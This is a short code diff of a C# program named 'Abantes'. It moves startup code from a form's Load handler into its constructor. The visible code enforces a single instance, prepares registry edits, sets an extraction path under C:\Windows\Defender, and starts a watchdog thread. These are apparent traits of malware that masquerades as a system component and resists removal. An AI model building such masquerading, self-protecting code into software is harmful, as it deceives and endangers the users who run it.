@@ -21,10 +21,6 @@ namespace Abantes
         public MainThread()
         {
             InitializeComponent();
-        }
-
-        private void MainThread_Load(object sender, EventArgs e)
-        {
             if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
             RegistryKey editKey;
             string extractPath = @"C:\Windows\Defender";
@@ -241,6 +237,10 @@ namespace Abantes
                 normalThread.Start();
                 watchdogThread.Start();
             }
+        }
+        private void MainThread_Load(object sender, EventArgs e)
+        {
+            
         }
     }
 }
